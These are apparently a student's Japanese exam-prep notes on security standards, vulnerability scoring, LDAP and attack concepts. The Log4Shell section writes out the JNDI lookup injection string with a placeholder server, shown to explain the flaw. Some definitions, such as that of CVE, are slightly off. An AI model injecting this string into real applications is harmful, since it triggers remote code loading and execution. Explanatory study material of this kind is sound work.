---
title: セキスペ入門 その他午前2対策知識
tags:
 - セキスペ
date: 2025/10/20
---

## FIPS140
Federal Information Processing Standardization 140。
NISTの制定した暗号モジュールのセキュリティ要件を規定する米国連邦政府標準規格。

## JIS関連
### JIS Q 27001
ISO 27001をベースに、JISが定めた情報セキュリティマネジメントシステムに関する要求事項

### JIS X 0160.2021
ソフトウェアライフサイクルプロセスに関する規格。ISO/IEC 12207:2017をベースにしている。

#### ソフトウェア実装プロセス
大体ウォーターフォールモデル？出典が分からん
- ソフトウェア要求事項分析
- ソフトウェア方式設計
- ソフトウェア詳細設計
- ソフトウェア構築
- ソフトウェア統合
- ソフトウェア適格性確認テストプロセス

#### Tailoring(修整)
プロジェクトの目的や特性に応じて、プロセス・アクティビティの調整を行うこと。

### JIS X 25010:2013
ソフトウェア製品の品質特性と評価に関する規格。ISO/IEC 25010をベースにしている。
8つの品質特性が定義されている。
- 機能適合性 指定された状況下で、明示的/暗黙的な要求事項を満たす能力
- 性能効率性 指定された状況下で、使用するリソースに対する性能レベル
- 互換性　製品やシステムが他の製品やシステムと連携して動作する能力
- 使用性　指定された状況下で、有効性・効率性を達成するために利用者が製品を使用できる能力
- 信頼性　指定された時間帯、条件下でシステム・製品が機能を維持する能力
- セキュリティ　製品・システムが定められたデータアクセスの制御を維持する能力
- 保守性　意図した保守者による、製品・システムの修正への有効性・効率性
- 移植性　特定の運用環境・利用環境からその他の環境にシステム・製品を移すときの有効性・効率性

## ISO/IEC 15408
Common Criteria for Information Technology Security Evaluation。
IT製品・システムのセキュリティ機能に関する国際規格。

## ISO/IEC 27017
クラウドサービスにおける情報セキュリティ管理のための国際規格。

## ISO/IEC 27002
情報セキュリティ管理のための実践規範を定めた国際規格。

## ISO/IEC 30147
IoT製品やサービスを実装するにあたってのライフサイクルプロセスを定めた国際規格。



## CASB
Cloud Access Security Broker
シャドーITの検知のため、企業とクラウドサービスの間に設置される監視機能。
- 可視化
- コンプライアンス
- データセキュリティ
- 脅威防御
を提供し、組織の許可を得ないクラウドサービスの利用を発見・管理することができるようになる

## CVE
Common Vulnerabilities and Exposures。
米国の非営利団体MITREによって策定されたソフトウェアにおけるセキュリティ上の弱点の種類を識別するための基準

## CVSS
Common Vulnerability Scoring System。
ソフトウェアの脆弱性に対する、ベンダーに依存しないオープンで汎用的な深刻度の評価方法
3つの基準が存在する
- 基本評価基準(CVSS基本値) 脆弱性そのものの評価。機密性/完全性/可用性 に対する影響を考慮
- 現状評価基準(CVSS現状値) 脆弱性の現在の深刻度を評価。Exploit codeの存在の有無、対策情報の有無を考慮
- 環境評価基準(CVSS環境値) 製品利用者の利用環境を含め、最終的な脆弱性の深刻度を評価。

## NIST SP800-40
Creating a Patch and Vunerability Management Program。
ソフトウェアのセキュリティアップデートを行うときに推奨される管理プロセス、組織体制などをまとめたガイドライン
cf. https://www.ipa.go.jp/security/reports/oversea/nist/about.html

## SBOM
Software Bill of Materials。
ソフトウェアコンポーネントやそれらの依存関係をリスト化した資料。


## CRYPTREC暗号リスト
CRYPTRECによって電子政府での使用に際しての安全性及び実装性能が確認された暗号方式のリスト
- 電子政府推奨暗号リスト
市場での利用実績が十分であるか、今後の普及が見込まれると判断され、利用が推奨される暗号のリスト
- 推奨暗号候補リスト
今後、電子政府推奨暗号リストに掲載される可能性のある暗号のリスト
- 運用監視暗号リスト
実際に解読されるリスクが高まるなどして、推奨すべきでなくなった暗号のうち、互換性維持のために継続利用を容認する暗号のリスト

## Pass the Hash攻撃
Hash(ユーザ名 + Hash(パスワード)) の形式をもつチャレンジレスポンス方式の認証において、クライアントメモリ上のHash(パスワード)を盗み取って不正ログインする攻撃。





## ISMAP
Information System Security Management and Assessment Program
政府調達に必要なセキュリティを確保したクラウドサービスを評価・登録する制度
日本セキュリティ監査境界クラウド情報セキュリティ管理基準をベースとする。
ISMAP-LIもある



## 証拠保全ガイドライン第10版
デジタルフォレンジクスにおいて、保全すべきデータの優先度。揮発性のあるデータから優先的に保全すべき。
1. レジスタ・キャッシュ
2. ルーティングテーブル、ARPキャッシュ、プロセステーブル、カーネル統計、メモリ
3. 一時ファイルシステム
4. ディスク
5. ログと監視データ
6. 物理設定、ネットワークトポロジ
7. アーカイブメディア

## SOAP
Simple Object Access Protocol。
ネットワークを介して分散環境でオブジェクトを操作するためのプロトコル。

## XKMS
XML Key Management Specification。
PKIの機能をWebサービスとして提供するための仕様。

## CPPM
Content Protection for PrRecorded Media。
コンテンツをメディアに暗号化した状態で記録し、再生時に対応した機器でないと復号できないようにする技術。
違法コピーを防止する。

## CPRM
Content Protection for Recordable Media。
CPPMと同様の技術だが、記録型メディアに対応したもの。

## ステガノグラフィ
画像や音声などのデジタルデータに、別の情報を埋め込む技術。

## サイバーキルチェーン
標的型の各段階を7つに分けて分析するフレームワーク。
1. 偵察 Reconnaissance
    標的となる個人、組織を調査し、攻撃に利用できそうな情報を収集する
2. 武器化 Weaponization
    攻撃のためのマルウェアを作成する
3. 配布 Delivery
    マルウェアの添付、あるいは悪意のあるリンクなどをメールに仕込んで送信する
4. 攻撃 Exploitation
    標的にマルウェアを実行させる
5. インストール Installation
    標的にマルウェアを感染させる
6. コマンド&コントロール Command and Control
    感染したマルウェアと攻撃者のC2サーバ間で通信を確立する
7. 目的達成 Actions on Objectives
    情報の窃取、破壊など、攻撃者の目的を達成する



## IPA関連
### J-CSIP
Initiative for Cyber Security Information sharing Partnership of Japan.サイバー情報共有イニシアチブ。
IPAと各傘下組織間でNDAを締結し、傘下組織間において検知されたサイバー攻撃等の情報をIPAに集約。
IPA側で分析、匿名かを行い、傘下組織間で情報共有を行う仕組み。

### JCMVP
Japan Cryptographic Module Validation Program。
電子政府推奨暗号リスト等に記載されている暗号化機能等を実装したモジュール、アルゴリズムが、適切に情報を保護できることを第三者機関が評価・認定する制度。

## NICT関連
### NOTICE
National Operation Towards IoT Clean Environment.
国内のIoT機器に対し、推測可能なパスワードの利用などによって悪用されるおそれのある機器を調査し、ISPを通じて当該機器の利用者に注意喚起を行う取り組み。

### DAEDALUS
Direct Alert Environment for Darknet and Livenet Unified Security.
NICTが運用するダークネット観測網で、マルウェアに感染したIoT機器からのパケットを検知し、分析結果を製造者にフィードバックする仕組み。

### セキュリティ・バイ・デザイン
製品・サービスの企画・設計段階からセキュリティを考慮すること。

## LDAP
Lightweight Directory Access Protocol。RFC4510.
ディレクトリサービスにアクセスするためのプロトコル。
LightWeight、の名の通り、階層構造をもつテキストデータを効率的に検索・参照するために設計されている。
Activve DirectoryはLDAPをベースにした、MS独自の拡張を加えたもの。

### 操作
- Bind 認証
- Search ディレクトリの検索
- Unbind 切断
- Add エントリの追加
- Delete エントリの削除
- Modify エントリの変更

#### 認証に使う
LDAPの主な用途はユーザ認証である。BIND操作での応答を通じて、認証の成否を確認できる。
BIND操作は、LDAPサーバに対して、次のようなフォーマットでリクエストを送る。
```
BINDREQUEST
    version: 3
    name: <ユーザのDN>
    authentication: simple //パスワード認証の場合。SASLでKerberos認証などした方がsecure.
        <パスワード>
```
ここでDN(Distinguished Name)は、ディレクトリ内でエントリを一意に識別するための名前。
例: `uid=taro,ou=users,dc=example,dc=com`
リクエストに一致するエントリが存在し、かつパスワードが正しければ、サーバはsuccessのBINDRESPONSEを返す。

::: info
ユーザが入力するのはDNとは限らない。例えばMSのログインだとメールアドレスを入力する。
メールアドレスからDNを特定するには、まずSearch操作でメールアドレスに一致するエントリを探し、そのDNを取得する、というステップを踏む必要がある。
(WindowsのActiveDirectoryだとuserPrincipalName属性にメールアドレスを入れてそれで特定する？chatGPT調べなので信ぴょう性0)
:::

::: info
 **なぜLDAPを使う？**
 LDAPはユーザ属性や、グループ情報などの情報を管理することができる。
 Kerberos単体では、「その人が誰か」のみの証明で、その人がどのグループに所属しているか、などの情報をもたせることができない。
 Active DirectoryはLDAP + Kerberosで構成されており、LDAPでユーザ属性を管理し、Kerberosで認証を行うことで、認証と属性情報の両方を扱うことができる。
:::

### Log4shell脆弱性
CVE-2021-44228.
文字列をログに記録するようなアプリケーションにおいて、ログに記録する文字列に特定のJNDI参照を含めることで、攻撃者の用意したLDAPサーバにアクセスし、悪意のあるJavaクラスをロードさせ、任意のコードを実行させることができる脆弱性。
JNDI(Java Naming and Directory Interface)とは、JavaでディレクトリサービスにアクセスするためのAPI。
外部リソースをLDAP(等のプロトコル)経由で参照、ロードすることができる。

#### 仕組み
Log4jは、ログメッセージ中の`${}`という形式を動的に展開する機能を持っており、
これに`${jndi:ldap://<サーバ>/<パス>}` のような記述を与えると、JNDIを通じてLDAPサーバにアクセスし、指定されたパスのJavaクラスをロードしようとする。
攻撃者は、LDAPサーバを用意し、悪意のあるJavaクラスを配置しておくことで、Log4jを利用するアプリケーションに対して任意のコードを実行させることができてしまう。

## CMS
Content Management System。
Webコンテンツを効率的に管理・運用するためのシステム、フレームワーク。WordPressなど。